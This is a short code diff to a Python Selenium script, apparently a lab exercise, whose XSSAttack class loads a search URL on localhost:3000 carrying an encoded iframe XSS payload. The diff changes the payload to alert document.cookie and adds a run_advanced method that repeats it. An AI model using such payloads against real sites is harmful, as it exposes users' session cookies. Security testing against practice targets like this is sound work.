@@ -115,8 +115,14 @@ class XSSAttack:
         # open base url
         driver.get(self.base_url)
         time.sleep(2)
-        attack_url = "http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E"
+        # show cookie in new iframe 
+        attack_url = "http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(document.cookie)%22%3E"
         driver.get(attack_url)
+
+    def run_advanced(self):
+        driver = webdriver.Chrome(options=self.chrome_options)
+        driver.get(self.base_url)
+        attack_url = "http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(document.cookie)%22%3E"
 
         #TODO click on actual search field 
         """
